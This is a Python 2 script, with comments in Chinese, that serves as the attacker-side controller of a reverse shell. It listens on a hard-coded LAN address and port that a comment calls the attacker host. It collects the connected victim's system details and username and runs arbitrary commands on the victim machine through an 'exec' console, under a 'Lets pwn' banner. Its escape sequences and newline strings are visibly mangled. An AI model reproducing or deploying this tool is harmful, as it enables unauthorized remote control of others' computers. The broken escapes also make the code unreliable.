# -*- coding: utf-8 -*-
import socket,subprocess as sp
import sys
import os
import platform
 
# 颜色美化函数
def script_colors(color_type,text):
    color_end = '33[0m'
 
    if color_type.lower() == "r" or color_type.lower() == "red":
        red = '33[91m'
        text = red + text + color_end
    elif color_type.lower() == "lgray":
        gray = '33[2m'
        text = gray + text + color_end
    elif color_type.lower() == "gray":
        gray = '33[90m'
        text = gray + text + color_end
    elif color_type.lower() == "strike":
        strike = '33[9m'
        text = strike + text + color_end
    elif color_type.lower() == "underline":
        underline = '33[4m'
        text = underline + text + color_end
    elif color_type.lower() == "b" or color_type.lower() == "blue":
        blue = '33[94m'
        text = blue + text + color_end
    elif color_type.lower() == "g" or color_type.lower() == "gree":
        gree = '33[92m'
        text = gree + text + color_end
    elif color_type.lower() == "y" or color_type.lower() == "yellow":
        yellow = '33[93m'
        text = yellow + text + color_end
    else:
        return text
    return text
 
# 横幅函数
def banner():
    banner = '''
sszhhzDDhzszhzzhhzssss====ss=+===+====ss=szzzzzzzDDDDhDhzzsD
s+zhhzhhzzsshhzhzhhsss====ss==sss====szszzhhhzzzzhzDDDDDzssD
=+zzhhhhzzhzhhhhzzzssssszsszz=szss====ssszhhhhhhzszDhDDhz==h
=+zzhhhzzhhhzzhhzssss+szsssss=sss=s+=s=sszzzhhhDhzhhhhhhs+=h
z+shzzzzzhzhhhzhsssss+=sszs=s=sssss=====szszhhzzhhsshhhhs(=h
s<=hhzzzhsszhhzsshhzs=+szzsss===ssss==+=szzszzzzzzhzhDhh=<hh
=<=hhzzzzszzss=szhhszs=+shssss==ssss=+<szzzszzhzszzzhDDh+=hh
+=shDshzzssz=sszzs=szz=+=zs=+s==s======zzzzzhzzhzsszshBh=<sh
<==szsszzsssszsss+++zz=++sz==s=====+=+=zssshzzzzszszszDh=<+h
(((<=s=sssssssss=+===s=<+=ssssss=s==++=ss+==ss=sszsss=+++<<z
((<+=sssssss=++=+<+++s+<====ssszs=s=+<=s==+++=sszz====<((((+
<<<+++=s=s===+++++++ss+++====sss====++zs=<++++=sss====+((<((
+((<<=s=+==s=s=+=(<=sh++==s==ss=====++sz=++==+<=ss=+<<<((((<
<((<+++=====++++++++szs=+=s=s=s=====+=zs++++=+<<=====<<((((<
(<+<<+=+=s=+<=szszs=sss=======s======sz=+=+=s+<<<==+++<((~~(
<++<<+++=ssszDDhDBBDzsssss====+=+==ssss=zDDDDhs<<==+<<((((~(
++<<<<<+=szshhsshz=hDs==ss==+=<<+=ss=+=hBDsshBD=<+++<(~((<((
=<++<+++=zs+hs+zDs--hh=+===+=+<<+=s=++hDh<.-=sh=+++<<(((~(<(
+<=+=====+<<z=<hDhz=sDs<<+=++<(<++=<(zszh=~s+<s+<===<<((((((
++=+++<<(<(<z=<hBBNh=hD+<+=<<<(<<+<(+z+sDDDD<<z=~(+=+<(<(~((
+===+<<<<<<<ss<=hBD++hB<(<<<<<((<<~-sh<=BNNz<<z+~(<<<((<((((
==ss=++=+<<<=z+(+=+<=BB<(<<<<<(<(<~-zB<(=Dh+(sz(~~<<<((+<(((
==ss=====+++<=z=+<+sDBB<~<<(<<((((-~zNz((+<(=h+~((<<<<(<<(<<
==========+<+<+szhhDDDD<-(<((((~~~~~zDDh=+=zh=((<+++<<(<<<<<
===s========+<<<++++<+D+~(<(((((~~~(s+=shzzs<(+=++++<((<(<<<
=====s=======++((~~~-+h=(<<<+<((((-(s<--(<<((<====+<<((<<<(+
==+===ss======+=<~((<+==((<<(~~(((-<=+~--~(<+++++=+<<(((<+<+
s=====ssss=+++==++++=<++(<+~~---((~++(((((<++++<+++<<((((<<=
ss===sss=s==s=+=+++++<<+(<(~~~~-~(~<<~(<<<<=<<=+++<<<<((<<<=
sss==sszssss=s=+++++<((<=<(~~~~--~<=<~~(<<<+<<+++<<+<<<(+<<s
sssssszzszss=====+++<((=s<(~~~~~~~+=(~(~(+<<++++++==++<<=<=s
ssssszhhzzzssss==++<<((+s+<(~~~~~(=+--~~~<<<++++===s++<+++zs
zssssszzzzzhzsss=++<<~(<+=<<((~(((=(-'~(((<+++=szs=s=++++=zz
hsszzssszzzhzss=s++<((((+===<((<+<+~'--~(<<<=sszsss====+=szz
hzsszzzsszzzhsszz=<<<<<<=szz=+==ss=<-~~(~(+=+=sss==s===+szzz
hhzsszzzzzzzzzzhzss=<+++shDhhzzhhhh(~(((<+=+=ssssszss===szzs
zhzssszzzzzzzhz=+=s+==+<<zDDDDhDDz<'~(<<+<((=ssszzzs===zzzss
hhhhzzzzzzzzzhz=ss=s++<<(<zBDDDDh<'~~(~(<<++====+===++szzsss
hhhhzzzzzzzzzzzssszzss==+<+hDDDD+~~(<+<+=+++szzzzzs==szzssss
zhhhhhhzzzzzzzzzss=======+++hBB=(<<<(<<++==szssszs=+=zhzzsss
zhhhDhhzzzsszzzhzsszzss+===+sDh+==+<<++===ssssssss=szhhzzzzs
hhhhhhhhzzzzhhhhhzsssss=ssssshzs=++=+=+==sssssss=sszhzzzzzzs
zzhhhhhhDDhhhhhhhzzzssssszsszhhz=======ssssszsss=shhhzzzsszs
zzzhzhhDDDDDhhhhhhhzzzzhhhzhhhhhzzzhzssszzzzzzszhzhhzzzzzzzs
zzzzhhhhDhDDDhhhDhhhhzzhhhhzzhzzhhhhzszzhzzszhhhhhhzzzzsszzs
zzzhhhhhDDDDDDDDDDDhhhzs=zzzzzzzss=szzhhhhhhhDDhhzzzzzzzzsss
zzzhhhhhDhhhDDDDDDDDDDhzzs=szss==szzhhDDDDDDDDhhhhzzzzzzzzsz
zzhhhhhhhhhhDDDDDDDDDDDDDzs=ss==szDDDDDDDDDDDhhDDhhzzzzzzzsz
zzhhzhhhhhhDDDDDDDDDDDDDDDhhhhzhDDDhDDDDDDhhhhhhhhhzzzzzzzsz
zzzzzhhhhhhhDDDDDDDDDDDDDDDDDDDDDDhDDDhhhhhhhzhzzzhzzzzzzzzs
             --=[ Version 1.0 Alpha Scarlet ]=--
             --=[ I am ready ... Lets pwn   ]=--
'''
    return script_colors('gray',banner)
 
# 控制台函数
def console(connection, address):
    print (script_colors("g", " [ Info ] ") + script_colors("b", "Connection Established from %sn" % (address)))
 
    sysinfo = connection.recv(2048).split(",")
 
    x_info = ''
    x_info += script_colors("g","Operating System: ") +"%sn" % (script_colors("b",sysinfo[0]))
    x_info += script_colors("g","Computer Name: ") +"%sn" % (script_colors("b",sysinfo[1]))
    x_info += script_colors("g","Username: ") + "%sn" % (script_colors("b",sysinfo[5]))
    x_info += script_colors("g","Release Version: ") + "%sn" % (script_colors("b",sysinfo[2]))
    x_info += script_colors("g","System Version: ") + "%sn" % (script_colors("b",sysinfo[3]))
    x_info += script_colors("g","Machine Architecture: ") + "%s" % (script_colors("b",sysinfo[4]))
 
    if sysinfo[0] == "Linux":
        user = sysinfo[6] + "@" + address
    elif sysinfo[0] == "Windows":
        user = sysinfo[7] + "@" + address
    else:
        user = "Unknown@" + address
 
    while 1:
        command = raw_input(" " + script_colors("underline",
                                                script_colors("lgray","%s" % (user))) + " " + script_colors('lgray',">") + " ").strip()
        if command.split(" ")[0] == "exec":
            if len(command.split(" ")) == 1:
                print (script_colors("r", "n [!] ") + script_colors("b", "Command: exec <command>"))
                print (script_colors("g", "n Execute Argument As Command On Remote Hostn"))
                continue
 
            res = 1
            msg = " "
 
            while len(command.split(" ")) > res:
                msg += command.split(" ")[res] + " "
                res += 1
 
            response = send_data(connection,"exec " + msg)
 
            if response.split("n")[-1].strip() != "":
                response += "n"
            if response.split("n")[0].strip()!="":
                response = "n" + response
 
            for x in response.split("n"):
                print (" " + x)
        elif command == "":
            continue
        elif command == "cls":
            if sysinfo[0] == "Linux":
                dp = os.system("clear")
            elif sysinfo[0] == "Windows":
                dp = os.system("cls")
        elif command == "help":
            print (script_colors("lgray",help()))
        elif command == "sysinfo":
            if sysinfo[0] == "Linux":
                print( script_colors("g", "Operating System: ") + "%s" % (script_colors("b", sysinfo[0])))
                print( script_colors("g", "Computer Name: ") + "%s" % (script_colors("b", sysinfo[1])))
                print( script_colors("g", "Username: ") + "%s" % (script_colors("b", sysinfo[6])))
                print( script_colors("g", "Release Version: ") + "%s" % (script_colors("b", sysinfo[2])))
                print( script_colors("g", "System Version: ") + "%s" % (script_colors("b", sysinfo[3])))
                print( script_colors("g", "Machine Architecture: ") + "%s" % (script_colors("b", sysinfo[4])))
            elif sysinfo[0] == "Windows":
                print( script_colors("g", "Operating System: ") + "%s" % (script_colors("b", sysinfo[0])))
                print( script_colors("g", "Computer Name: ") + "%s" % (script_colors("b", sysinfo[1])))
                print( script_colors("g", "Username: ") + "%s" % (script_colors("b", sysinfo[7])))
                print( script_colors("g", "Release Version: ") + "%s" % (script_colors("b", sysinfo[2])))
                print( script_colors("g", "System Version: ") + "%s" % (script_colors("b", sysinfo[3])))
                print( script_colors("g", "Machine Architecture: ") + "%s" % (script_colors("b", sysinfo[4])))
 
        elif command == "exit()":
            connection.send("exit()")
            print (script_colors("b"," [+] ") + script_colors("g","Shell Going Down"))
            break
        else:
            print (script_colors("red","[!] Unknown Command"))
 
# 帮助函数
def help():
    help_list = {}
    help_list["sysinfo"] = "Display Remote System Information"
    help_list["exec"] = "Execute Argument Ad Command On Remete Host"
    help_list["cls"] = "Clears The Terminal"
    help_list["help"] = "Prints this help message"
 
    return_str = script_colors("g", "n Command ") + " . "
    return_str += script_colors("b", " Descriptionn %sn" % (script_colors("gray", "-" * 50)))
 
 
    for x in sorted(help_list):
        dec = help_list[x]
        return_str += " " + script_colors("g", x) + " - " + script_colors("b", dec + "n")
 
    return return_str.rstrip("n")
 
# 发送数据
def send_data(connection,data):
    try:
        connection.send(data)
    except socket.error as e:
        print (script_colors("red","[ - ]") + "Unable To Send Data")
        return
 
    result = connection.recv(2048)
    total_size = long(result[:16])
    result = result[16:]
 
    while total_size > len(result):
        data = connection.recv(2048)
        result += data
 
    return  result.rstrip("n")
 
# 主控制函数
def main_control():
    try:
        #host = sys.argv[1]      # 攻击者主机地址
        #port = int(sys.argv[2]) # 攻击者主机端口
 
        host = "192.168.14.45"
        port = 3800
 
 
    except Exception as e:
        print (script_colors("red","[-]") + "Socket Information Not Provided")
        sys.exit(1)
 
    print (script_colors("g"," [+]") + script_colors("b"," Framework Standard Successfully"))
    print(banner())
 
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # 安装套接字
    s.bind((host,port))
    s.listen(5)
 
    if host == "":
        host = "localhost"
 
    print (script_colors("g", " [info] ") + script_colors("b", "Listening on %s%d ..." % (host, port)))
 
    try:
        conn,addr = s.accept()
    except KeyboardInterrupt:
        print ("nn " + script_colors("red", "[-]") + script_colors("b", " User Request An Interrupt"))
        sys.exit(0)
 
    console(conn,str(addr[0]))
 
    s.close() # 关闭套接字
 
if __name__ == "__main__":
    main_control()